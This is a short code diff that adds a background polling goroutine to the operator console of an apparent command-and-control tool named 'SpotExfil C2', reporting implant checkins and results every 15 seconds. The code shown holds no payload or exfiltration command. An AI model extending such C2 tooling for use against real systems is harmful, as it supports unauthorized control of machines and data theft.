@@ -153,6 +153,20 @@ func (op *Operator) checkForCheckins() {
 	}
 }
 
+// startBackgroundPoller runs a goroutine that continuously polls
+// for new checkins and results, printing them asynchronously.
+func (op *Operator) startBackgroundPoller(stopCh chan struct{}) {
+	interval := 15 * time.Second
+	for {
+		select {
+		case <-stopCh:
+			return
+		case <-time.After(interval):
+			op.checkForCheckins()
+		}
+	}
+}
+
 // Interactive runs the interactive operator console.
 func (op *Operator) Interactive() {
 	fmt.Println("SpotExfil C2 Operator Console")
@@ -160,6 +174,11 @@ func (op *Operator) Interactive() {
 
 	// Initial check for pending checkins
 	op.checkForCheckins()
+
+	// Start background poller for automatic checkin/result notifications
+	stopCh := make(chan struct{})
+	go op.startBackgroundPoller(stopCh)
+	defer func() { close(stopCh) }()
 
 	scanner := bufio.NewScanner(os.Stdin)
 
